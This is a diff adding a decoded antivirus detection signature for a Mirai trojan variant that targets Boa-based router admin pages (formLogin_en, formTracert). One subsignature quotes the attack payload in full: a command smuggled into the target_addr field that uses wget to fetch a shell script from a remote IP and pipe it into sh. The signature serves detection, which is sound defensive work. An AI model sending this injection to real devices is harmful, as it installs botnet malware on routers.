@@ -1,0 +1,28 @@
+VIRUS NAME: Unix.Trojan.Mirai-9873138-0
+TDB: Engine:51-255,Target:6
+LOGICAL EXPRESSION: 0&1&2&3&4
+ * SUBSIG ID 0
+ +-> OFFSET: ANY
+ +-> SIGMOD: NONE
+ +-> DECODED SUBSIGNATURE:
+POST /boaform/admin/formLogin_en HTTP/1.1
+ * SUBSIG ID 1
+ +-> OFFSET: ANY
+ +-> SIGMOD: NONE
+ +-> DECODED SUBSIGNATURE:
+target_addr="1.1.1.1+`cd%2Ftmp+wget+-O+-+http%3A%2F%2F212.192.241.72%2Flolol.sh+%7C+%2Flolol%2Fsh+sh+lolol%2Fsh`"&waninf=127.0
+ * SUBSIG ID 2
+ +-> OFFSET: ANY
+ +-> SIGMOD: NONE
+ +-> DECODED SUBSIGNATURE:
+POST /boaform/admin/formTracert HTTP/1.1
+ * SUBSIG ID 3
+ +-> OFFSET: ANY
+ +-> SIGMOD: NONE
+ +-> DECODED SUBSIGNATURE:
+Referer: http://127.0.0.1/diag_ping_admin_en.asp
+ * SUBSIG ID 4
+ +-> OFFSET: ANY
+ +-> SIGMOD: NONE
+ +-> DECODED SUBSIGNATURE:
+#)GET /%1b%5d%32%3b%6f%77%6e%65%64%07%0a necho -en "GET /
